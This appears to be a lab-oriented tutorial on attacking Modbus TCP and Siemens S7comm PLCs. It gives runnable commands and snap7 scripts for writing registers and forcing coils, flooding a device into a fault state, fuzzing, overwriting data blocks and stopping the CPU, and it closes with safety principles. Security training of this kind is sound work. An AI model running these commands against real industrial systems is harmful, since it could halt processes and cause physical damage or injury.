# Modbus and S7comm Attack Guide

## Overview

Modbus TCP and Siemens S7comm are two of the most widely deployed ICS protocols, and both share a critical security limitation: they were designed in an era when network security was not a consideration. Modbus has zero authentication or encryption. S7comm, while offering optional password protection on newer firmware, is often deployed without it. This guide covers attack techniques against both protocols in lab environments.

**WARNING:** These techniques must only be used in isolated lab environments with non-production equipment. Unauthorized manipulation of industrial control systems can cause physical damage, environmental releases, injury, or death.

## Part 1: Modbus TCP Attacks

### Understanding the Modbus Attack Surface

Modbus TCP operates on a simple request-response model. The master sends a function code request, and the slave responds. There is no session establishment, no handshake, no authentication, and no encryption. Any host that can reach port 502 on a Modbus device becomes an unauthorized master.

Key function codes for attack:

| Function Code | Name | Risk |
|---------------|------|------|
| 01 | Read Coils | Information disclosure |
| 02 | Read Discrete Inputs | Information disclosure |
| 03 | Read Holding Registers | Information disclosure |
| 04 | Read Input Registers | Information disclosure |
| 05 | Write Single Coil | Process manipulation |
| 06 | Write Single Register | Process manipulation |
| 15 | Write Multiple Coils | Process manipulation |
| 16 | Write Multiple Registers | Process manipulation |
| 43 | Read Device Identification | Device fingerprinting |

### Register Mapping and Process Understanding

Before any write attack, you must understand what the registers control. In a lab environment:

```bash
# Read the full register space to map process variables
modbus-cli read -a 192.168.1.10 -s 1 -r 0 -n 125 -t holding
modbus-cli read -a 192.168.1.10 -s 1 -r 125 -n 125 -t holding
modbus-cli read -a 192.168.1.10 -s 1 -r 250 -n 125 -t holding

# Read coil states to understand digital I/O mapping
modbus-cli read -a 192.168.1.10 -s 1 -r 0 -n 100 -t coil
```

Registers typically map to physical process variables: temperature setpoints, valve positions, pump states, alarm thresholds, and flow rates. Documenting this mapping is essential for understanding the potential impact of any write operation.

### Register Manipulation Attacks

```bash
# Write a new value to a holding register (setpoint manipulation)
modbus-cli write -a 192.168.1.10 -s 1 -r 10 -v 500 -t holding

# Write multiple consecutive registers (multi-variable attack)
modbus-cli write -a 192.168.1.10 -s 1 -r 10 -v 500,750,1000 -t holding

# Force a coil ON (activate a digital output)
modbus-cli write -a 192.168.1.10 -s 1 -r 5 -v 1 -t coil

# Force a coil OFF (deactivate a digital output)
modbus-cli write -a 192.168.1.10 -s 1 -r 5 -v 0 -t coil

# Use mbpoll for rapid register modification
mbpoll -t 192.168.1.10 -p 502 -m tcp -r 10 -1 -v 999
```

### Modbus Denial of Service

A simpler but effective attack is to overwhelm a Modbus slave with rapid requests, potentially causing a watchdog timeout that forces the PLC into a fault state:

```bash
# Rapid-fire register reads to stress the device
for i in $(seq 1 1000); do
  modbus-cli read -a 192.168.1.10 -s 1 -r 0 -n 125 -t holding &
done
```

### Modbus Protocol Fuzzing with csric

`csric` provides structured fuzzing for Modbus and other ICS protocols. It generates malformed packets to test the robustness of protocol parsers:

```bash
# Fuzz Modbus TCP with default settings
csric -t 192.168.1.10 -p 502 -P modbus -f fuzz

# Target specific function codes
csric -t 192.168.1.10 -p 502 -P modbus -f fuzz --function 0x03

# Limit iterations for controlled testing
csric -t 192.168.1.10 -p 502 -P modbus -f fuzz --iterations 500 --output fuzz_results/

# Capture all fuzzing traffic for crash analysis
tcpdump -i eth0 -w modbus_fuzz.pcap port 502 &
```

Fuzzing can reveal buffer overflows, integer overflows, and parsing errors in PLC firmware that may lead to remote code execution or denial of service.

## Part 2: Siemens S7comm Attacks

### S7comm Protocol Structure

S7comm operates over TCP port 102 using Siemens's TPKT and COTP transport layers. Communication follows a three-phase model:

1. **COTP Connection Request/Confirm** — Transport layer connection
2. **S7 Communication Setup** — S7 session parameters negotiation
3. **S7 Data Exchange** — Read/write operations, job requests

### Protection Level Assessment

Siemens PLCs support three protection levels controlled by the protection level register:

| Level | Access | Risk |
|-------|--------|------|
| No protection | Full read/write access to all areas | Critical |
| Write protection | Read access to all areas, no writes | High |
| Read/Write protection | No access without password | Medium |

Use s7scan to determine the protection level:

```bash
s7scan -t 192.168.1.20
```

### S7comm Memory Access Attacks

When a PLC has no protection (or the password is known/default), an attacker can access the full PLC memory space:

```bash
# Read from data block DB1, offset 0, length 64 bytes
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
data = c.db_read(1, 0, 64)
print('DB1 raw data:', data.hex())
c.disconnect()
"

# Read from a different memory area (I/O, markers, timers)
python3 -c "
from snap7.client import Client
from snap7.types import Areas
c = Client()
c.connect('192.168.1.20', 0, 1)
# Read marker memory (M area)
markers = c.read_area(Areas.MK, 0, 0, 32)
print('Marker area:', markers.hex())
c.disconnect()
"

# Write to a data block (lab only)
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
data = bytearray(64)
data[0:4] = b'\\xde\\xad\\xbe\\xef'
c.db_write(1, 0, data)
print('Wrote to DB1')
c.disconnect()
"
```

### PLC State Manipulation

Changing the PLC operating mode is one of the most impactful attacks. Switching from RUN to STOP halts all process logic:

```bash
# Read current CPU state
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
state = c.get_cpu_state()
print(f'CPU State: {state}')
c.disconnect()
"

# Stop the PLC (lab only — this halts the process)
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
c.set_cpu_state('STOP')
print('PLC stopped')
c.disconnect()
"
```

### Block List Enumeration

Listing all blocks in the PLC reveals the program structure, data blocks, and function blocks:

```bash
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
blocks = c.list_blocks()
print(f'Total blocks: {len(blocks)}')
for b in blocks:
    print(f'  Type: {b.blktype}, Number: {b.blknumber}')
c.disconnect()
"
```

### S7comm Fuzzing

```bash
# Fuzz the S7comm protocol
csric -t 192.168.1.20 -p 102 -P s7comm -f fuzz

# Capture fuzzing traffic
tcpdump -i eth0 -w s7_fuzz.pcap port 102 &
csric -t 192.168.1.20 -p 102 -P s7comm -f fuzz --iterations 1000
```

## Part 3: Safety Implications and Responsible Testing

ICS attacks differ fundamentally from IT attacks because they affect the physical world. Key safety principles for any ICS security testing:

1. **Never test against production systems.** Use a dedicated lab environment with identical (or similar) equipment.
2. **Understand the process.** Before any write operation, understand what physical process the register controls. A single register write could open a valve, start a pump, or change a temperature setpoint.
3. **Watchdog timers.** Many PLCs have hardware watchdogs that trigger a safe state if the PLC crashes. Fuzzing may activate these watchdogs and change the process state.
4. **No rollback guarantee.** Unlike IT systems, ICS processes may not recover gracefully from interruption. A stopped PLC may require manual intervention to restart safely.
5. **Document all changes.** Maintain a detailed log of every operation performed, including register addresses, values read and written, and any observed changes in the process.
6. **Communicate with operators.** In a real engagement, ensure control room operators are aware of testing activities and can halt testing if they observe process anomalies.
